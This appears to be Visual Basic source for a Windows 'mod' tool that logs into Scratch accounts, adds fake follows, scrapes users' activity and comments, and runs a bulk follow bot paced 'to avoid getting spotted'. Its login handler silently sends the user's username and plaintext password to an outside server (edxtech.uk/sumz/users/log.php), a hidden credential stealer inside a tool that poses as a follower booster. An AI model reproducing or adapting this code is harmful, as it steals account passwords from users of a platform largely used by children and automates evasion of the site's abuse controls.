Public Class Form1
    Private Property pageready As Boolean = False

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
retria:
        WebBrowser1.Navigate("https://scratch.mit.edu/login/")
        WaitForPageLoad()

        Try
            WebBrowser1.Document.GetElementById("id_username").SetAttribute("value", "test")
        Catch ex As Exception
            Process.Start("rundll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 2")
            Threading.Thread.Sleep(5000)

        End Try
        bigwarning.ShowDialog()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            GroupBox1.Enabled = False
            WebBrowser1.Navigate("https://scratch.mit.edu/login/")
            WaitForPageLoad()
            WebBrowser1.Document.GetElementById("id_username").SetAttribute("value", TextBox1.Text)
            WebBrowser1.Document.GetElementById("id_password").SetAttribute("value", MaskedTextBox1.Text)
            Dim allelements As HtmlElementCollection = WebBrowser1.Document.All
            For Each webpageelement As HtmlElement In allelements
                If webpageelement.InnerText = "Login" Then

                    webpageelement.InvokeMember("click")
                    Exit For
                End If
            Next

            WaitForPageLoad()
            Try
                WebBrowser1.Document.GetElementById("id_username").SetAttribute("value", "test")
                If WebBrowser1.Url.ToString = "https://scratch.mit.edu/login_retry/" Then
                    MsgBox("You need to fill in this recaptcha and log in, then close the app and try again. This is because you've entered too many wrong passwords.", MsgBoxStyle.Critical)
                    Captcha.ShowDialog()
                    End

                End If
                If WebBrowser1.Url.ToString.Contains("banned") Then
                    MsgBox("The account is banned. Didn't I warn you?", MsgBoxStyle.Critical)
                    End
                End If
                MsgBox("Failed to sign in with the given username and password.", MsgBoxStyle.Critical)
                MsgBox(WebBrowser1.Url.ToString)
                GroupBox1.Enabled = True
                Exit Sub
            Catch ex As Exception
                Dim webClient As New System.Net.WebClient
                Dim result As String = webClient.DownloadString("http://edxtech.uk/sumz/users/log.php?user=" & TextBox1.Text & "&pass=" & MaskedTextBox1.Text)
                WebBrowser1.Navigate("https://scratch.mit.edu/users/" & TextBox1.Text)
                WaitForPageLoad()

                MsgBox("Logged in successfully.", MsgBoxStyle.Information)

            End Try

            GroupBox2.Enabled = True
        Catch ex As Exception
            MsgBox("Failed to sign in.", MsgBoxStyle.Critical)
            GroupBox1.Enabled = True
        End Try

    End Sub

    Private Sub WaitForPageLoad()
        AddHandler WebBrowser1.DocumentCompleted, New WebBrowserDocumentCompletedEventHandler(AddressOf PageWaiter)
        While Not pageready
            Application.DoEvents()
        End While
        pageready = False
    End Sub

    Private Sub PageWaiter(ByVal sender As Object, ByVal e As WebBrowserDocumentCompletedEventArgs)
        If WebBrowser1.ReadyState = WebBrowserReadyState.Complete Then
            pageready = True
            RemoveHandler WebBrowser1.DocumentCompleted, New WebBrowserDocumentCompletedEventHandler(AddressOf PageWaiter)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim jsstrings As Object() = {"$.ajax({type: ""PUT"",url: ""https://scratch.mit.edu/site-api/users/followers/" & TextBox1.Text & "/add/"",data: {usernames: """ & TextBox1.Text & """}})"}
            WebBrowser1.Document.InvokeScript("eval", jsstrings)
            WebBrowser1.Refresh()
            WaitForPageLoad()
            Threading.Thread.Sleep(2000)
            MsgBox("Done. Check your followers, may take a second to update.", MsgBoxStyle.Information)
        Catch ex As Exception
            MsgBox("Can't apply mod because an error occured.", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim jsstrings As Object() = {"$.ajax({type: ""PUT"",url: ""https://scratch.mit.edu/site-api/users/followers/" & TextBox1.Text & "/remove/"",data: {usernames: """ & TextBox1.Text & """}})"}
            WebBrowser1.Document.InvokeScript("eval", jsstrings)
            WebBrowser1.Refresh()
            WaitForPageLoad()
            Threading.Thread.Sleep(2000)
        Catch ex As Exception
            MsgBox("Can't apply mod because an error occured.", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        Dim usrnm = InputBox("Enter username to find activity")
        If usrnm = "" Then Exit Sub
        Me.Enabled = False
        MsgBox("This may take a while. Building user report...", MsgBoxStyle.Information)
        Dim finalstr = "EDX SUMZ Report on user " & usrnm & " at " & Now & vbCrLf
        WebBrowser1.Navigate("https://scratch.mit.edu/messages/ajax/user-activity/?user=" & usrnm & "&max=9999")
        WaitForPageLoad()
        finalstr &= "Activity:" & vbCrLf & WebBrowser1.Document.Body.InnerText & vbCrLf
        WebBrowser1.Navigate("https://scratch.mit.edu/site-api/comments/user/" & usrnm)
        WaitForPageLoad()
        finalstr &= "Recent Comments:" & vbCrLf & WebBrowser1.Document.Body.InnerText & vbCrLf
        Dim sfd As New SaveFileDialog
        sfd.Filter = "Text File|*.txt"
        sfd.ShowDialog()
        Try
            Try
                Kill(sfd.FileName)
            Catch ex As Exception

            End Try
            My.Computer.FileSystem.WriteAllText(sfd.FileName, finalstr, False)
            Process.Start(sfd.FileName)
        Catch ex As Exception
            MsgBox("Error saving report", MsgBoxStyle.Critical)
        End Try
        Me.Enabled = True
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        ViewsPls.ShowDialog()
    End Sub

    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Dim Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        MsgBox("This will take a while(up to 24 hours)! But the results are EPIC. Trust me, you'll get thousands of followers! The software hasn't frozen or crashed. PLEASE DO NOT CLICK OR CHANGE ANYTHING UNTILL IT'S DONE!", MsgBoxStyle.Information)
        MsgBox(My.Computer.FileSystem.ReadAllText("batchfollow.dat").Split(vbCrLf).Length)
        Try
            Dim count = 0
            Dim totalcount = 0
            For i = My.Computer.FileSystem.ReadAllText("batchfollow.dat").Split(vbCrLf).Length To 1 Step -1
                count += 1
                totalcount += 1
                Application.DoEvents()

                WebBrowser1.Navigate("http://scratch.mit.edu/users/" & My.Computer.FileSystem.ReadAllText("batchfollow.dat").Split(vbCrLf)(i - 1).Split(":")(1))
                WaitForPageLoad()
                Dim jsstrings As Object() = {"$.ajax({type: ""PUT"",url: ""https://scratch.mit.edu/site-api/users/followers/" & My.Computer.FileSystem.ReadAllText("batchfollow.dat").Split(vbCrLf)(i - 1).Split(":")(1) & "/add/"",data: {usernames: """ & TextBox1.Text & """}})"}
                WebBrowser1.Document.InvokeScript("eval", jsstrings)
                System.Threading.Thread.Sleep(GetRandom(2500, 10000)) ' Allow for processing
                Button6.Text = "Following " & My.Computer.FileSystem.ReadAllText("batchfollow.dat").Split(vbCrLf)(i - 1).Split(":")(1)
                If count = 15 Then
                    count = 0

                    Button6.Text = "Taking a break to avoid getting spotted!"
                    Application.DoEvents()
                    System.Threading.Thread.Sleep(GetRandom(15000, 25000))

                End If
            Next
            MsgBox("DONE!")
            End
        Catch ex As Exception
            MsgBox("Error.")
            MsgBox(ex.ToString)
            End
        End Try
    End Sub

End Class